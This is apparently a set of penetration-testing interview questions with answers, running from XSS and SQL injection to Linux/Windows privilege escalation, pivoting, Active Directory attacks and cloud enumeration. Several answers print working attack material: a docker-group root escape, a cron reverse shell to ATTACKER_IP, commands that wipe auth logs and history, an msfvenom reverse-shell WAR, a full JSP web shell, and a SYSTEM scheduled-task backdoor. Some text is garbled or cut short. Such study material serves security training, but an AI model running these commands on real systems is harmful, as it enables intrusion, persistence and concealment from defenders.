# Pentesting (red team) interview questions

### 1. What port does ping work over?

It doesn’t work on a specific port unlike other network tools. It uses the Internet Control Message Protocol (ICMP). ICMP doesn't have a concept of ports in the same way that protocols like TCP or UDP do. Specifically, ping uses ICMP type 8 (echo request) and ICMP type 0 (echo reply). 


### 2. Can you give me two examples of web application hacking techniques?

**Cross-site scripting (XSS)** is the most common web application attack. It involves injecting malicious script into web pages that are viewed by other users. It’s categorised into three main types: stored XSS, reflected XSS and Dom-based XSS. It usually combine with Cross-site request forgery (CSRF) to make a big damage of the server.

Stored XSS occurs when malicious code is permanently stored on the server and retrieved by other users. Reflected XSS involves an attacker tricking a user into making a request to a server that includes a malicious payload. DOM-based XSS exploits vulnerabilities in client-side code, specifically the Document Object Model (DOM), to inject malicious scripts. 

**Cross-site request forgery (CSRF)** is a type of web application attack that tricks a user into executing an unwanted action on a web application that they are already authenticated with. This is typically accomplished by sending a specially crafted link or script to the user, which then performs the unwanted action when clicked. 

For example, a CSRF attack could be used to make unauthorized purchases or change account settings. CSRF attacks can be prevented by using anti-CSRF tokens, which are unique tokens that are generated by the web application for each user session and must be included in every request to the application.

For example, in a blog website, attackers can combine XSS and CSRF to craft a blog when the administrator of the website view the blog, it will send the admin’s credential signature like cookie or token back to the attacker’s computer to achieve authentication bypass.

concatenated
**Injection attacks** involve inserting malicious code into a web application, typically in the form of input data such as SQL queries, commands, or scripts. Injection attacks are successful when an application fails to properly validate and sanitize input data. These attacks can be prevented by properly validating and sanitizing input data and using parameterized queries to access databases.

**Fuzz testing**, also known as fuzzing, is a technique used to discover vulnerabilities in a web application by sending it random or invalid input data. The goal of fuzz testing is to identify how the web application responds to different inputs and to find errors and crashes. 

Fuzz testing can be performed manually or with the help of automated tools. Fuzz testing can uncover vulnerabilities that may not be detected by other security testing methods such as penetration testing. To perform effective fuzz testing, a tester needs to understand the web application’s input and output mechanisms and the types of data that the application processes.

A **brute force attack** is an automated method of guessing a username and password combination to gain unauthorized access to a web application. Attackers use software tools to try different combinations of usernames and passwords until they successfully guess the correct one.

To prevent brute force attacks, web applications can implement rate-limiting and account lockout policies. Rate-limiting limits the number of login attempts from a single IP address, while account lockout temporarily blocks access to an account after a certain number of failed login attempts.
 
**Path traversal** is a type of web application attack that involves manipulating file paths in a web application in order to access unauthorized files or directories on the server. Path traversal attacks typically occur when a web application does not properly validate user input, allowing an attacker to traverse up and down directory structures to access sensitive files. 

Path traversal attacks can be prevented by properly validating user input and sanitizing file paths, as well as using secure file access methods that restrict access to sensitive files and directories.

### 3. How many SQL Injection types do you know of?

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve.

SQL injections typically fall under three categories: In-band SQLi (Classic), Inferential SQLi (Blind) and Out-of-band SQLi. You can classify SQL injections types based on the methods they use to access backend data and their damage potential.

### 4. Where are credentials stored in a Windows/Linux system?

In Windows, application and network credentials are stored in the Windows Credentials Locker, which is a secure storage location. In Linux, user passwords are typically stored in the /etc/shadow file. Additionally, some Linux distributions use a separate file like /etc/security/passwd for encrypted passwords. 

Windows: (NTLM (New Technology LAN Manager))

**Credential Manager:**
This tool stores credentials for websites, network locations, and applications in a secure location, according to Microsoft Support. 

**Windows Credentials Locker:**
Stores credentials in encrypted .vcrd files located in the user's AppData directory. 

**SAM (Security Accounts Manager) Database:**
This database stores user passwords in a hashed format, which is encrypted with the boot key within the SYSTEM file. It is located in the registry and is accessible only while Windows is running or by local administrators. 

**LSA (Local Security Authority) Secrets:**
Windows also uses LSA secrets to store sensitive information, including cached domain credentials. 

**Passkeys:**
Passkeys are stored locally on your device and can be managed in Settings > Accounts > Passkeys

### 5. Say you find a file disclosure vulnerability, what are some ways you could exploit this to its full extent?

A file disclosure vulnerability can be extremely powerful if exploited properly. Here are some ways to maximize its impact, depending on the context (web app, local system, cloud environment, etc.):

**Critical File Targets (Linux/Unix)**

If the server is Linux-based, prioritize reading these files:

`/etc/passwd` → Lists users (potential usernames for brute-forcing)

`/etc/shadow` → Contains password hashes (crackable with tools like John the Ripper)

`/etc/group` → Reveals group memberships (privilege escalation paths)

SSH keys → `~/.ssh/id_rsa`, `~/.ssh/authorized_keys` (for lateral movement)

Configuration files:

`/etc/environment` (environment variables)

`/etc/hosts` (network mapping)

`/etc/crontab` (scheduled tasks for privilege escalation)

Database credentials:

`/var/www/html/config.php` (common in PHP apps)

`/etc/mysql/my.cnf` (MySQL credentials)

`wp-config.php` (WordPress database credentials)

**Critical File Targets (Windows)**

If the server is Windows, look for:

`C:\Windows\System32\drivers\etc\hosts` (network info)`

`C:\Windows\win.ini` / `C:\Windows\system.ini` (system configs)

`C:\boot.ini` (older Windows systems)

`Web.config` (ASP.NET apps, often contains DB credentials)

Registry backups (`C:\Windows\repair\SAM`, `C:\Windows\System32\config\RegBack\*` for password hashes)

User directories (`C:\Users\Administrator\Desktop\passwords.txt` – yes, sometimes it's that easy)

**Web Application Exploitation**

Source code disclosure:

`/var/www/html/index.php` (or other web root files)

`.git/` directory → If accessible, reconstruct source with git-dumper

`.env` files (contain API keys, database credentials)`

Session files (/tmp/sess_[id] in PHP) → Hijack sessions

Log files:

`/var/log/apache2/access.log` (may contain sensitive requests)

`/var/log/auth.log` (SSH login attempts)

Exploit log poisoning (if you can write to logs, inject PHP/commands)

**Cloud & Container Environments**

AWS/Azure/GCP metadata endpoints (if running in cloud):
http://169.254.169.254/latest/meta-data/ (AWS EC2)

May leak IAM keys, instance roles

Kubernetes:

`/var/run/secrets/kubernetes.io/serviceaccount/token` (K8s API access)

`/proc/self/environ` (environment variables, often contain secrets)

Docker breakout:

`/proc/self/cgroup` (check if inside container)

`/etc/hostname` (container ID)

Exploit writable host paths (`docker.sock` access → full container escape)`

Privilege Escalation Leads

SUID binaries (`find / -perm -4000 2>/dev/null`) → Check for misconfigurations

Cron jobs (`/etc/crontab`) → Exploit writable scripts

SSH keys (`/home/*/.ssh/id_rsa`) → Reuse stolen keys

History files:

`~/.bash_history` (may contain passwords in plaintext)

`~/.mysql_history` (could have DB credentials)

Post-Exploitation & Pivoting

Extract passwords from configs (e.g., grep -ri "password" /var/www/)

Exfiltrate data (compress & download /home/ or /var/)

Check for backups (/var/backups/, *.bak, *.tar.gz files)

Lateral movement (use stolen credentials on other services: SSH, FTP, DBs)

### 6. Say you find port 25 open, how could you use this to potentially enumerate usernames?

An open Port 25 (SMTP) can be a goldmine for username enumeration since many email servers allow verification of valid users. 

Simple Mail Transfer Protocol

### 7. You gain initial access on a Linux host, and see that you are a member of the docker group. How could you use this to elevate privileges?

If you're a member of the docker group on a Linux system, you can escalate to root in multiple ways because Docker inherently grants near-privileged access.

**If the docker group allows you to run containers as root on the host.** You can spawn the root shell by mounting the host filesystem.

```bash
docker run -v /:/hostfs -it --rm alpine chroot /hostfs bash
```

`-v /:/hostfs` → Mounts the host’s root (`/`) into the container at `/hostfs`.

`chroot /hostfs bash` → Escapes into the host’s filesystem as root.

Alternative (If Docker CLI is Restricted)

```bash
docker run -it --privileged --rm -v /:/mnt alpine
```

`--privileged` → Grants full host access (even more dangerous).

### 8. You've elevated privileges on the Linux host, and see that it is dual-homed. You can view the internal network. How would you gather information on that internal network?

Now that you've gained root access on a dual-homed Linux host (connected to both an external and internal network), you can pivot into the internal network for reconnaissance. 

- **Network Discovery (Identify Live Hosts & Services)**

a. Check Existing Network Connections

```bash
netstat -tulnp  # Check listening services
ss -tulnp       # Modern alternative to netstat
arp -a          # View ARP cache (hosts recently communicated with)
route -n        # Check routing table (identify internal subnets)
ip a            # List all network interfaces
```

b. Passive Sniffing (Capture Traffic)

```bash
tcpdump -i eth1 -w internal_traffic.pcap   # Replace 'eth1' with internal NIC
```

Analyze later with Wireshark (`scp` the `.pcap` to your machine).

c. Active Scanning (If Stealth is Not Critical)

```bash
# Ping sweep (ICMP)
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "bytes from"; done

# Fast scan with nmap (if installed)
nmap -sn 192.168.1.0/24   # Ping sweep
nmap -sT -p 22,80,443,3389 192.168.1.1-254  # Check common ports
```

Alternative if `nmap` is missing:

```bash
for port in 22 80 443; do
  for ip in {1..254}; do
    timeout 1 bash -c "echo >/dev/tcp/192.168.1.$ip/$port" 2>/dev/null && echo "192.168.1.$ip:$port OPEN" &
  done
done
```

- **Service Enumeration (Find Vulnerable Systems)**

- **Credential Harvesting (Extract Passwords & Keys)**

a. Check Common Files for Credentials

```bash
grep -ri "password" /etc/ /var/www/ /home/ 2>/dev/null
find / -name "*.conf" -o -name "*.cfg" -exec grep -i "pass" {} + 2>/dev/null
```

b. Dump Memory for Passwords

```bash
strings /dev/mem | grep -i "password"  # Requires root
```

- **Pivoting (Use the Host as a Proxy)**

a. SSH Dynamic Port Forwarding (SOCKS Proxy)

b. Metasploit Pivoting

- **Persistence (Maintain Access)**

a. Add SSH Backdoor

b. Cron Job for Reverse Shell

```bash
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
```

- **Cleanup (Avoid Detection)**

Disable logging:

```bash
echo "" > /var/log/auth.log
history -c
```

Use encrypted tunnels (`ssh -R`) instead of raw scans.

### 9. Say you've enumerated the internal network and found a Windows host running Apache Tomcat, what is your next move? Could you use this to gain a shell on the box? How would you set up your pivots?

**Confirm Tomcat Exposure & Version**

a. Check Tomcat Version

b. Check Default Credentials

**Exploit Tomcat (Gain Shell)**

a. Upload a Malicious WAR File (If Manager Access)

- Generate a reverse shell WAR (using msfvenom):

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your_IP> LPORT=4444 -f war > shell.war
```

- Deploy via Tomcat Manager (/manager/html):

Log in → Upload `shell.war`.

Access the shell at `http://<target_IP>:8080/shell/`.

- Catch the shell (on your machine)

b. Exploit Known Vulnerabilities (If No Creds)

**Privilege Escalation (Windows)**

**Pivoting (Route Traffic Through Compromised Host)**

**Maintaining Access**

a. Install a Webshell

Upload a JSP backdoor (e.g., `cmd.jsp`):

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr); 
        disr = dis.readLine();
    }
}
%>
````

b. Persistence via Scheduled Task

```powershell
schtasks /create /tn "UpdateTask" /tr "C:\shell.exe" /sc hourly /mo 1 /ru SYSTEM
```

### 10. Say you've gotten a shell on the Windows host, and you see the account your shell is running as has the `SeImpersonate` privilege. How could you use this for privilege escalation?

`SeImpersonatePrivilege` allows a process to impersonate other users (including SYSTEM) under certain conditions. It’s commonly abused via:

- Potato-family exploits (Hot Potato, Juicy Potato, Rogue Potato, PrintSpoofer, GodPotato).

- Named pipe impersonation (abusing Windows services that run as SYSTEM).

### 11. You've elevated privileges and obtain a shell as `NT AUTHORITY\SYSTEM`, what would you do now? You are in an Active Directory environment.

Since you’ve achieved `NT AUTHORITY\SYSTEM` on a Windows host in an Active Directory (AD) environment, the attack goal shifts to **lateral movement**, **privilege escalation**, and **domain dominance**.

- **Reconnaissance (Gather Intel)**

a. Local System Enumeration

b. Active Directory Enumeration

c. Credential Harvesting

- **Lateral Movement (Pivot to Other Hosts)**

a. Pass-the-Hash (PtH)

b. Kerberoasting

c. SMB/PSExec Exploitation

- **Domain Privilege Escalation**

a. DCSync Attack (Dump All Domain Hashes)

b. Golden Ticket Attack

c. ACL Abuse (Delegation, AdminSDHolder)

- **Persistence (Maintain Domain Access)**

a. Golden/Silver Tickets

b. DCShadow Attack (Stealthy Backdoor)

c. Create Backdoor Accounts

- **Covering Tracks (Avoid Detection)**

a. Clear Event Logs

b. Disable AV/Logging

c. Use Stealthy Exfiltration

- **Post-Exploitation Checklist**

### 12. Say you got a cloud target for penetration testing, what will you do?

Cloud environment: AWS, Azure, GCP (Google Cloud Platform), etc.

Find exposed assets:

Use tools like `Shodan`, `Censys`, or `GrayhatWarfare` (for public S3 buckets).

Search GitHub for leaked credentials (`target.com` + `aws_access_key`).

Domain Enumeration:

Subdomains (`subfinder`, `amass`) → Check for `*.s3.amazonaws.com`.

Cloud Metadata API (If you have initial access):

```bash
curl http://169.254.169.254/latest/meta-data/ (AWS)
curl http://metadata.google.internal/computeMetadata/v1/ (GCP)
```

DNS/SSL Certificates:

Use `dig` or `nslookup` to find cloud-hosted services.

**Exploit Misconfigured Services**

S3 Buckets:

```bash
aws s3 ls s3://bucket-name --no-sign-request  # Check for public access
aws s3 cp s3://bucket-name/secret.txt .      # Download files if allowed
```

Azure Blob Storage:

```bash
az storage blob list --account-name <name> --container-name <container> --auth-mode login
```

**Compromise IAM Credentials**

Leaked Keys:

Check environment variables, CI/CD pipelines, or old commits.

Validate keys with:

```bash
aws sts get-caller-identity --profile compromised
```

